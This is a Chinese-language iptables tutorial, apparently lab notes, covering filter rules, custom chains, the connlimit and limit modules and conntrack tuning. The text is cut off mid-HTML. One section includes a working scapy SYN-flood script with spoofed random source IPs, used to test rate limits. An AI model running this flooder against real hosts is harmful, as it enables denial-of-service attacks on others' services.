class="hljs none">[root@master script]#which iptables<br>/usr/sbin/iptables<br>[root@master script]#ll `which iptables`<br>lrwxrwxrwx. 1 root root 13 Feb 19 12:44 /usr/sbin/iptables -&gt; xtables-multi<br><br>rpm -ql iptables<br>rpm -q iptables：查看iptables的安装情况<br></code></pre></td></tr></table></figure><p>5个钩子函数：总入口PRE-ROUTING，INPUT(到内部)，OUTPUT(内部出去)，FORWARD(穿过本机出去)，POST-ROUTING(总出口)</p><p>称为chain(链子)</p><p>通过iptables可以控制五种协议的执行，放行某些数据包等</p><p>上层协议栈：内部访问的应用的协议，比如http/https，TCP/IP端口等；一般来说，访问到内部的服务，一般配置INPUT</p><p><img src="2792175-20220828181112783-192218826.png" alt="image-20220724174240149"></p><h2 id="Linux-netfilter内的5个表-5表5链"><a href="#Linux-netfilter内的5个表-5表5链" class="headerlink" title="Linux netfilter内的5个表(5表5链)"></a>Linux netfilter内的5个表(5表5链)</h2><p>每个chain对应一个钩子函数，5表5链，钩子函数称为webhook，钩子</p><p>5个表table：<strong>最主要：filter和NAT</strong></p><p>filter：过滤规则，允许/拒绝某些流量流入，比如INPUT，OUPUT等</p><p>NAT：地址转换表，包括SNAT和DNAT</p><p>mangle：修改数据规则表</p><p>raw：加快通过防火墙的速度</p><p>security：强制安全规则，由SELINUX实现，/etc/</p><h1 id="iptables基本参数-公有云iptables原理"><a href="#iptables基本参数-公有云iptables原理" class="headerlink" title="iptables基本参数(公有云iptables原理)"></a>iptables基本参数(公有云iptables原理)</h1><p>公有云iptables原理：默认拒绝所有</p><p>iptables -A INPUT -j REJECT</p><p>需要一条一条规则去放行，或者是端口，这些规则需要写在拒绝所有规则的前面，放xxx网段对应的端口，只不过做成了SAAS产品</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">-p tcp/udp --dport 80<br>-p tcp -m multiport --dports 80,443,8081<br>-p tcp -m iprange --src-range 10.0.0.129-10.0.0.254<br></code></pre></td></tr></table></figure><p>默认用的就是filter表，主要包括的chain链如下：</p><p>主要使用的chain：INPUT(输入)，FORWARD(转发)，OUTPUT(输出)</p><p>TCP三次握手协议：可以看到TCP连接的状态，一般都是有去有回的，比如SSH连接，建立了就是ESTABLISHED建立连接状态，或者是LISTENING监听状态，没和服务器建立连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -nL：查看iptables基本规则或者iptables -vnL，常用-nL<br>iptables -F：关闭iptables功能<br>-v：查看细节，chain等<br>-s：源地址<br>-d：目的地址<br>-j：动作，DROP丢弃<br><br>iptables -S：查看目前已经创建的规则<br><span class="hljs-comment">##简单写一条拒绝iptables指令，从10.0.0.129任何数据包都无法到10.0.0.128了，且两边都无法ping通，C/S架构，icmp包要去了能回来才行</span><br>iptables -A INPUT -s 10.0.0.129 -j DROP<br><br><span class="hljs-comment">##简单使用tcpdump在10.0.0.128上抓个包看看，-i网卡，-n网络协议，通过防火墙策略拒绝了包的发送，其实icmp包是相互，双向的</span><br>tcpdump -i ens33 -n icmp<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181113147-1045072885.png" alt="image-20220727220826893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -vnL：还可以看到这个规则拒绝了多少个包<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181113416-105127330.png" alt="image-20220727215225662"></p><h2 id="iptables基本匹配规则-基本功能"><a href="#iptables基本匹配规则-基本功能" class="headerlink" title="iptables基本匹配规则(基本功能)"></a>iptables基本匹配规则(基本功能)</h2><p>按照插入的规则顺序进行过滤filter</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">-s：源地址<br>-d：目的地址<br>-p：protocal协议<br>-m：启用扩展模块<br><br><span class="hljs-comment">##TARGET动作</span><br>iptables -j：对-s来的数据包操作<br>-j DROP：丢弃，不回应<br>-j REJECT：拒绝，refuse包<br>-j ACCEPT：接受，允许<br><br>iptables -F：删除掉某个chain的规则<br>iptables -F WEB：清空掉有关自定义链的内容<br><br>iptables -A <span class="hljs-comment">##默认添加，到最后面，在现有的规则上新加一条</span><br>iptables -D INPUT 5 <span class="hljs-comment">##删除掉第五行iptables</span><br>iptables -I INPUT -s 10.0.0.129 -j REJECT <span class="hljs-comment">##-I表示在最前面插入一条规则，默认走最前面的规则，最好都走-I，插到最前面</span><br>iptables -P INPUT <span class="hljs-comment">##修改整个chain链的规则，比如都为REJECT或者是DROP</span><br><br><span class="hljs-comment">##一般来说，在企业内的主机出方向都是不受限制，OUTPUT，入方向限制比较多，可以设定加白策略</span><br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181113693-28668394.png" alt="image-20220728222651565"></p><p>拒绝所有的10.0.0.129的包，只允许icmp包(插入顺序)，也可以-I指定插入的行数(条目数)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -I INPUT -s 10.0.0.129 -j REJECT<br>iptables -I INPUT -s 10.0.0.129 -p icmp -j ACCEPT<br><span class="hljs-comment">##换成telnet 10.0.0.128，会显示连接被拒绝，refused，就是REJECT规则的写法</span><br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181113980-1910491149.png" alt="image-20220728224656139"></p><h2 id="iptables配置别名alias显示行号：alias-ipnum-’iptables-nL-–line-numbers’"><a href="#iptables配置别名alias显示行号：alias-ipnum-’iptables-nL-–line-numbers’" class="headerlink" title="iptables配置别名alias显示行号：alias ipnum=’iptables -nL –line-numbers’"></a>iptables配置别名alias显示行号：alias ipnum=’iptables -nL –line-numbers’</h2><p>默认iptables -nL不显示行号，–line-numbers显示行号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">alias iptables -nl=&#x27;iptables -nl --line-numbers&#x27;<br>alias ipnum=&#x27;iptables -nL --line-numbers&#x27;<br>source .bashrc<br>使用这个别名alias<br></code></pre></td></tr></table></figure><h2 id="配置永久保存iptables规则：services-iptables-save"><a href="#配置永久保存iptables规则：services-iptables-save" class="headerlink" title="配置永久保存iptables规则：services iptables save"></a>配置永久保存iptables规则：services iptables save</h2><p>在Cent OS 6下，由于本身就有/etc/sysconfig/iptables文件，所以只需要执行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">service iptables save<br></code></pre></td></tr></table></figure><p>在Cent OS 7下，由于默认没有安装iptables.services服务，所以需要安装一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install iptables.services<br>systemctl <span class="hljs-built_in">enable</span> --now iptables<br><br>service iptables save <span class="hljs-comment">##保存iptables规则</span><br>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]<br><br>尝试一下reboot重启<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181114268-121294755.png" alt="image-20220728232225920"></p><p>cat /etc/sysconfig/iptables：查看一下iptables配置文件，里面写的都是默认规则</p><h1 id="iptables扩展模块-隐"><a href="#iptables扩展模块-隐" class="headerlink" title="iptables扩展模块(隐)"></a>iptables扩展模块(隐)</h1><p>tcp/udp模块：默认隐式扩展模块，不需要写-m扩展模块，一般的写法是iptables -I INPUT -p tcp -m tcp/udp等这样</p><p>允许10.0.0.129访问128的httpd服务(80)端口，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##还是需要写上-p tcp表示允许什么协议通过</span><br>-p：什么协议protocal<br>--dport：目标端口<br>-s：写上源端口<br>-j：写上操作<br><br><span class="hljs-comment">##先拒绝所有，在单独放行80端口的访问，这里的--dport不加s</span><br>iptables -A INPUT -s 10.0.0.129 -j REJECT<br>iptables -I INPUT 2 -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT<br><br>ipnum<br>[root@master ~]<span class="hljs-comment">#iptables -I INPUT 2 -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT</span><br>[root@master ~]<span class="hljs-comment">#ipnum </span><br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     icmp --  10.0.0.129           0.0.0.0/0           <br>2    ACCEPT     tcp  --  10.0.0.129           0.0.0.0/0            tcp dpt:80<br>3    REJECT     all  --  10.0.0.129           0.0.0.0/0            reject-with icmp-port-unreachable<br><br>iptables -R INPUT：表示replace，替换掉某一条规则<br></code></pre></td></tr></table></figure><p>在10.0.0.129上访问10.0.0.128的80端口是成功的</p><p>curl k8s.catyer.cn</p><p>telnet k8s.catyer.cn 80</p><h1 id="iptables扩展模块-显-：可以多个扩展模块组合"><a href="#iptables扩展模块-显-：可以多个扩展模块组合" class="headerlink" title="iptables扩展模块(显)：可以多个扩展模块组合"></a>iptables扩展模块(显)：可以多个扩展模块组合</h1><p>让httpd协议支持ssl：安装mod_ssl模块服务</p><p>yum -y install mod_ssl</p><p>systemctl enable –now httpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://k8s.catyer.cn <span class="hljs-comment">##是OK的</span><br>curl -k https://k8s.catyer.cn <span class="hljs-comment">##忽略SSL安装告警</span><br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181114579-1186931059.png" alt="image-20220729230840271"></p><h2 id="m-multiport-–dports-80-443：批量添加端口，注意–dports加s"><a href="#m-multiport-–dports-80-443：批量添加端口，注意–dports加s" class="headerlink" title="-m multiport –dports 80,443：批量添加端口，注意–dports加s"></a>-m multiport –dports 80,443：批量添加端口，注意–dports加s</h2><p>示例：一条iptables规则放通80,443端口，129能够访问128的443和80端口</p><p>先-p：表示跑什么协议，-m表示扩展模块为multiport，–dports记得s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -I INPUT -p tcp -m multiport --dports 80,443 -s 10.0.0.129 -j ACCEPT<br>ipnum<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     tcp  --  10.0.0.129           0.0.0.0/0            multiport dports 80,443<br><br>slave1---&gt;master的443流量可以打开了<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181114863-700868194.png" alt="image-20220729233040836"></p><p><img src="2792175-20220828181115151-1306412835.png" alt="image-20220729233616409"></p><h2 id="N-WEB-CHAIN：创建自定义链"><a href="#N-WEB-CHAIN：创建自定义链" class="headerlink" title="-N WEB-CHAIN：创建自定义链"></a>-N WEB-CHAIN：创建自定义链</h2><p>自定义链：是一个模块化的东西，相当于是一个函数</p><p>iptables的链chain分为主链和自定义链，主链部分分为pre-routing，input，forward，output，post-routing，自定义链可以自行创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">-N：创建新的自定义链<br>-E old chain new chain：修改自定义链名字<br>-X：删除空的自定义链，必须是在INPUT表内没有调用，并且表内规则为空<br><br>iptables -S：显示目前已经创建的链规则，包括自带系统链和自定义链<br>[root@master ~]<span class="hljs-comment">#iptables -S</span><br>-P INPUT ACCEPT<br>-P FORWARD ACCEPT<br>-P OUTPUT ACCEPT<br>-N DOCKER<br>-N DOCKER-ISOLATION<br>-N WEB<br>-A INPUT -i virbr0 -p udp -m udp --dport 53 -j ACCEPT<br>-A INPUT -i virbr0 -p tcp -m tcp --dport 53 -j ACCEPT<br>-A INPUT -i virbr0 -p udp -m udp --dport 67 -j ACCEPT<br>-A INPUT -i virbr0 -p tcp -m tcp --dport 67 -j ACCEPT<br><br><br><span class="hljs-comment">##写自定义链</span><br>iptables -A INPUT(这里其实是写链名chain)<br>iptables -A WEB(写到自定义链中)<br><br><span class="hljs-comment">##将之前定义好的iptables规则写入WEB链中</span><br>iptables -I WEB -p tcp -m multiport --dports 80,443 -s 10.0.0.129 -j ACCEPT<br>Chain WEB (0 references)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            multiport dports 80,443<br><br><span class="hljs-comment">##上面的INPUT链就不需要了，直接写WEB链就可以了</span><br>iptables -D INPUT 5<br><br><span class="hljs-comment">##调用WEB函数，使其生效，插入到第五条INPUT链中，测试访问443端口是OK的；拟定一个UDP协议的端口53，加入到WEB内，不用修改INPUT主表</span><br>iptables -I INPUT 5 -j WEB<br>iptables -A WEB -p udp --dport 53 -s 10.0.0.129 -j ACCEPT<br><br>[09:04:49 root@slave1 ~]<span class="hljs-comment">#curl -k https://k8s.catyer.cn</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br>&lt;style&gt;<br></code></pre></td></tr></table></figure><h2 id="iptables-F：清空某个链-表-的规则"><a href="#iptables-F：清空某个链-表-的规则" class="headerlink" title="iptables -F：清空某个链(表)的规则"></a>iptables -F：清空某个链(表)的规则</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -F：删除掉某个chain的规则<br>iptables -F WEB：清空掉有关自定义链的<br>iptables -X WEB：清空某个空的自定义链<br><br>iptables -F INPUT：清空掉有关INPUT链的规则<br></code></pre></td></tr></table></figure><h2 id="iprange扩展：指定IP地址范围"><a href="#iprange扩展：指定IP地址范围" class="headerlink" title="iprange扩展：指定IP地址范围"></a>iprange扩展：指定IP地址范围</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">--src-range：源地址范围<br>--dst-range：目的地址范围<br><br><span class="hljs-comment">##实现129和130同时能够访问本机的80,443端口，nginx默认的访问端口是8001</span><br>iptables -A WEB -p tcp -m multiport --dports 80,443 -m iprange --src-range 10.0.0.129-10.0.0.130 -j ACCEPT<br>iptables -I WEB -p tcp -m multiport --dports 8001 -m iprange --src-range 10.0.0.129-10.0.0.130 -j ACCEPT<br></code></pre></td></tr></table></figure><h2 id="connlimit：限制访问服务端的连接并发数"><a href="#connlimit：限制访问服务端的连接并发数" class="headerlink" title="connlimit：限制访问服务端的连接并发数"></a>connlimit：限制访问服务端的连接并发数</h2><p>限制客户端访问服务端的并发连接数，通常用于拒绝DDOS工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">--connlimit-upto N：小于等于N匹配，REJECT/ACCEPT<br>--connlimit-above N：大于N匹配，REJECT/ACCEPT<br><br><span class="hljs-comment">##匹配如果并发连接数大于10的部分，全部拒绝，里面可以加端口号/IP等，-m multiport --dports 80,443</span><br>iptables -A INPUT -p tcp -m --connlimit-above 10 -j REJECT<br></code></pre></td></tr></table></figure><h2 id="limit：限流经过的包"><a href="#limit：限流经过的包" class="headerlink" title="limit：限流经过的包"></a>limit：限流经过的包</h2><p>限制在一分钟内的流过的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -A INPUT -p tcp -m limit --limit 10/minute<br></code></pre></td></tr></table></figure><h2 id="泛洪攻击的python脚本：升级python版本至python-3-5-1"><a href="#泛洪攻击的python脚本：升级python版本至python-3-5-1" class="headerlink" title="泛洪攻击的python脚本：升级python版本至python 3.5.1"></a>泛洪攻击的python脚本：升级python版本至python 3.5.1</h2><p>查看本机的python版本：python -V，需要升级python版本，执行python脚本</p><p>需要升级python版本到3以上</p><p>当在Python 2.X文件中写中文注释或输出中文时候，经常会出现编译错误（在Python 3.X中没有这种错误。）这是因为Python 2.X的默认编码文件是用ASCII码—-包括中文的注释</p><p><img src="2792175-20220828181115451-1027421414.png" alt="image-20220730115734200"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##安装python依赖包</span><br>yum install openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel sqlite-devel -y<br><br><span class="hljs-comment">##下载python-3.5.1版本的包</span><br>wget https://www.python.org/ftp/python/3.5.1/Python-3.5.1.tgz<br><br><span class="hljs-comment">##删除旧版本的python</span><br><span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">rm</span> -rf /usr/local/python<br><br><span class="hljs-comment">##安装3.5.1版本的python</span><br>tar -xf Python-3.5.1.tgz<br><span class="hljs-built_in">mv</span> Python-3.5.1 /usr/local<br><span class="hljs-comment">##配置</span><br>./configure<br><span class="hljs-comment">##编译安装</span><br>make &amp;&amp; make install<br><br><span class="hljs-built_in">ln</span> -s /usr/local/bin/Python3.5 /usr/local/python<br><span class="hljs-comment">##查看python版本</span><br>python3 -V<br>[14:06:19 root@slave1 ~]<span class="hljs-comment">#python3 -V</span><br>Python 3.5.1<br><br><span class="hljs-comment">##修改/usr/bin/yum的默认python版本，yum文件默认是python语言写的</span><br>vim /usr/bin/yum<br><span class="hljs-comment">#!/usr/bin/python2.7</span><br>import sys<br></code></pre></td></tr></table></figure><p>泛洪攻击脚本：DDOS攻击，分布式的拒绝服务，泛洪攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br> <br><span class="hljs-comment">#random IP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randomIP</span>():<br>    ip=<span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))))<br>    <span class="hljs-keyword">return</span> ip<br> <br><span class="hljs-comment">#random port</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randomPort</span>():<br>    port=random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">10000</span>)<br>    <span class="hljs-keyword">return</span> port<br> <br><span class="hljs-comment">#syn-flood</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>(<span class="hljs-params">count,dstIP,dstPort</span>):<br>    total=<span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Packets are sending ...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        <span class="hljs-comment">#IPlayer</span><br>        srcIP=randomIP()<br>        dstIP=dstIP<br>        IPlayer = IP(src=srcIP,dst=dstIP)<br>        <span class="hljs-comment">#TCPlayer</span><br>        srcPort=randomPort()<br>        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>        <span class="hljs-comment">#send pack</span><br>        packet = IPlayer / TCPlayer<br>        send(packet)<br>        total+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total packets sent: %i&quot;</span> % total)<br> <br><span class="hljs-comment">#infor</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#&quot;</span>*<span class="hljs-number">30</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# Welcome to SYN Flood Tool  #&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#&quot;</span>*<span class="hljs-number">30</span>)<br>    <span class="hljs-comment">#IP &amp; port </span><br>    dstIP = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target IP : 10.0.0.128&quot;</span>)<br>    dstPort = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target Port : 8001&quot;</span>))<br>    <span class="hljs-keyword">return</span> dstIP, dstPort<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dstIP, dstPort=info()<br>    count=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input the number of packets：&quot;</span>))<br>    synFlood(count,dstIP,dstPort)<br></code></pre></td></tr></table></figure><h2 id="state扩展：根据追踪机制去检查连接状态-一般是ESTABLISHED"><a href="#state扩展：根据追踪机制去检查连接状态-一般是ESTABLISHED" class="headerlink" title="state扩展：根据追踪机制去检查连接状态(一般是ESTABLISHED)"></a>state扩展：根据追踪机制去检查连接状态(一般是ESTABLISHED)</h2><p>面试题<br>这两条路径，都是Linux系统内可建立的最大连接数，上限并发，可以自己去设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##系统内已经建立的连接(state为established)</span><br>[root@master ~]<span class="hljs-comment">#cat /proc/net/nf_conntrack</span><br>ipv4     2 tcp      6 431954 ESTABLISHED src=172.16.58.35 dst=172.16.48.104 sport=46638 dport=443 src=172.17.0.2 dst=172.16.58.35 sport=443 dport=46638 [ASSURED] mark=0 zone=0 use=2<br>ipv4     2 tcp      6 13 CLOSE_WAIT src=172.16.48.131 dst=172.16.48.104 sport=38264 dport=443 src=172.17.0.2 dst=172.16.48.131 sport=443 dport=38264 [ASSURED] mark=0 zone=0 use=2<br><br><span class="hljs-comment">##这一条是本地连接的</span><br>ipv4     2 tcp      6 93 TIME_WAIT src=127.0.0.1 dst=127.0.0.1 sport=47186 dport=10051 src=127.0.0.1 dst=127.0.0.1 sport=10051 dport=47186 [ASSURED] mark=0 zone=0 use=2<br><br><span class="hljs-comment">##查看最大连接数</span><br>[root@master ~]<span class="hljs-comment">#cat /proc/sys/net/netfilter/nf_conntrack_max </span><br>65536<br>[root@master ~]<span class="hljs-comment">#cat /proc/sys/net/nf_conntrack_max </span><br>65536<br><br><span class="hljs-comment">##放通源端为10.0.0.129的icmp规则</span><br>Chain WEB (1 references)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     icmp --  10.0.0.129           0.0.0.0/0   <br></code></pre></td></tr></table></figure><h3 id="系统最大连接数-proc-sys-net-netfilter-nf-conntrack-max"><a href="#系统最大连接数-proc-sys-net-netfilter-nf-conntrack-max" class="headerlink" title="系统最大连接数/proc/sys/net/netfilter/nf_conntrack_max"></a>系统最大连接数/proc/sys/net/netfilter/nf_conntrack_max</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改最大连接数上限，ping请求无法过去</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/netfilter/nf_conntrack_max <br><span class="hljs-built_in">echo</span> 65536 &gt; /proc/sys/net/netfilter/nf_conntrack_max <br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181115773-566092871.png" alt="img"></p><p>查看系统日志(是linux系统日志)，证明是这个track表已经达到上限，直接丢包了(造成网站无法访问，访问的tcp连接直接中断)，需要恢复回去；类似的操作还有redis的最大连接上线并发，可以调整这个值</p><p>tail -f /var/log/messages</p><p><img src="2792175-20220828181116060-1442443540.png" alt="image-20220730143154880"></p><h3 id="nginx-配置系统最大连接并发net-nf-conntrack-max-系统调优-—-gt-面试题，配置内核配置文件sysctl-conf"><a href="#nginx-配置系统最大连接并发net-nf-conntrack-max-系统调优-—-gt-面试题，配置内核配置文件sysctl-conf" class="headerlink" title="nginx-配置系统最大连接并发net.nf_conntrack_max(系统调优)—&gt;面试题，配置内核配置文件sysctl.conf"></a>nginx-配置系统最大连接并发net.nf_conntrack_max(系统调优)—&gt;面试题，配置内核配置文件sysctl.conf</h3><p>需要修改系统内核参数配置文件：**/etc/sysctl.conf**</p><p>在生产系统中，通常有一些前端的机器需要用于转发外部的客户端请求，例如nginx等负载均衡服务器，需要配置一下net.nf_conntrack_max这个参数，免得并发一大系统就崩溃了，导致服务器无法执行转发服务</p><p>一键入职机器的net.nf_conntrack_max 参数，配置到了262144，因为是前端的nginx转发机器，转发到各个server中，转发到各个服务器组中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 